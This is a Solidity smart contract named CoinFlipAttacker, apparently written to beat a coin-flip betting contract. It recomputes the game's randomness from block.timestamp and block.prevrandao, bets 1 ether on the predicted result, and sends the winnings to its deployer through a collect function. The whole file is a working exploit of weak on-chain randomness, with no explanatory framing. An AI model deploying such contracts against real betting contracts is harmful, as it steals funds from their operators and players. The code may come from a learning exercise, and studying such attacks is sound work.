// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ICoinFlip {
    function play(bool guess) external payable;
}

contract CoinFlipAttacker {
    ICoinFlip public immutable coinFlip;
    address public immutable owner;

    constructor(address _coinFlip) {
        coinFlip = ICoinFlip(_coinFlip);
        owner = msg.sender;
    }

    function attack() external payable {
        bool outcome = uint256(
            keccak256(abi.encodePacked(block.timestamp, block.prevrandao))
        ) % 2 == 0;

        coinFlip.play{value: 1 ether}(outcome);
    }

    receive() external payable {}

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
